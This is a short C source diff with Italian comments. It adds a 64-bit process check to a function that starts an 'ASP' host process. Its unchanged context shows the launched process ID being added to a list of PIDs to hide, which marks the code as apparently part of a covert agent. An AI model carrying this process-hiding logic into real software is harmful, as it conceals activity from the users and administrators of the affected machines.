@@ -10,6 +10,7 @@
 #include "sha1.h"
 #include "aes_alg.h"
 #include <string.h>
+#include "x64.h"
 
 #define ASP_SLEEP_TIME 20
 #define ASP_START_TIMEOUT 60000 // un minuto di attesa per far inizializzare il processo host ASP
@@ -1220,6 +1221,12 @@ BOOL ASP_Start(char *process_name, char *asp_server)
 		return FALSE;
 	}
 	
+	// Se e' a 64 bit ci risparmiamo i passi successivi e chiudiamo subito...
+	if (IsX64Process(pi.dwProcessId)){
+		ASP_Stop();
+		return FALSE;
+	}
+
 	// Aggiunge pi.dwProcessId alla lista dei PID da nascondere 
 	// (e lo memorizza in pid_hide per poi poter togliere l'hide)
 	SET_PID_HIDE_STRUCT(pid_hide, pi.dwProcessId);
